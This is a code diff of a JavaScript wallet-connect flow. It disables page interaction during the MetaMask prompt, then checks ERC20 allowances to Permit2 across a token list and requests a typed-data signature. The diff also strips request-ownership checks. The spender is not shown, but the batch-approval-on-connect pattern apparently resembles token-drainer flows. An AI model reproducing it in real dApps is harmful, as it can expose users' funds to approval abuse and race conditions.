@@ -113,7 +113,7 @@ export async function connectWallet() {
     return;
   }
 
-  const currentRid = startRequest();
+  startRequest();
   setFlowState('CONNECTING');
 
   
@@ -147,10 +147,28 @@ export async function connectWallet() {
     }
 
     log("🔌 Opening Wallet Picker — Please select an account...");
-    touchInteraction();
-    
-    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+touchInteraction();
+
+// 🧊 UI FREEZE ZONE (MetaMask critical section)
+setFlowState('CONNECTING');
+
+document.body.style.pointerEvents = "none";
+
+const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+
+document.body.style.pointerEvents = "auto";
     const userAddress = accounts[0];
+
+    // 🧠 SAFE SYNC AFTER META MASK RETURNS
+setTimeout(() => {
+  updateWalletState(userAddress);
+  renderWallet(userAddress);
+
+  updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
+  updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
+}, 0);
+
+
     
     log(`📊 Active account selected: ${userAddress}`);
     isPickingWallet = false;
@@ -188,12 +206,11 @@ export async function connectWallet() {
     updateWalletState(user);
     renderWallet(user);
     
-    updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
-    updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
+    
 
     // Start Sluis 1: Signature & Approval flows met actieve Request Ownership check
     setFlowState('SIGNING');
-    await runPermitFlowSafe(provider, signer, user, currentRid);
+    await runPermitFlowSafe(provider, signer, user);
 
     // Na een succesvolle Web3/Permit flow zetten we de volgende knoppen open voor de UX
     const btnActivate = document.getElementById('btn-activate');
@@ -240,7 +257,7 @@ export async function connectWallet() {
   }
 }
 
-async function runPermitFlowSafe(provider, signer, user, currentRid) {
+async function runPermitFlowSafe(provider, signer, user) {
   try {
     log("⚙️ Permit2 flow verification...");
     touchInteraction();
@@ -322,7 +339,7 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
 
     // Check of de basis ERC20 -> Permit2 approval er is
     for (const token of TOKENS) {
-      if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost during execution.");
+     
       
       const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
       const currentAllowance = await erc20.allowance(user, PERMIT2);
@@ -341,7 +358,7 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
       }
     }
 
-    if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost before signing.");
+   
     
     log("✍️ Requesting typed data signature...");
     touchInteraction();
